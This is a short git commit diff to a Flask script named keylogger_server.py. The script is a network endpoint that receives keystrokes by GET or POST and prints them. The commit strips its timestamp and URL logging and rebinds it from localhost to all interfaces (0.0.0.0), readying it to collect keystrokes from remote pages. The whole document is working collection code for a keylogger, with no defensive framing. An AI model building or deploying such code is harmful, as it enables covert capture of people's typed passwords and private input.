7784f41458a03c4788cdd478bbefc4b962b9ec95
Robin <jauss94@gmail.com>
2025-11-18 08:47:21 +0100

    .

--- keylogger_server.py
+++ keylogger_server.py
@@ -1,5 +1,4 @@
 from flask import Flask, request
-from datetime import datetime
 
 app = Flask(__name__)
 
@@ -8,18 +7,13 @@ app = Flask(__name__)
 def log_key():
     if request.method == 'GET':
         key = request.args.get('key', '')
-        url = request.args.get('url', 'unknown')
     else:
-        key = request.form.get('key', '')
-        url = request.form.get('url', 'unknown')
+        key = request.form.get('key', '')    
     
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    
-    #print(f"[{timestamp}] Key pressed: '{key}' on {url}")
     print(key)
     return '', 204
 
 
 if __name__ == '__main__':
     print("Keylogger")
-    app.run(host='127.0.0.1', port=8000, debug=False)
+    app.run(host='0.0.0.0', port=8000, debug=False)
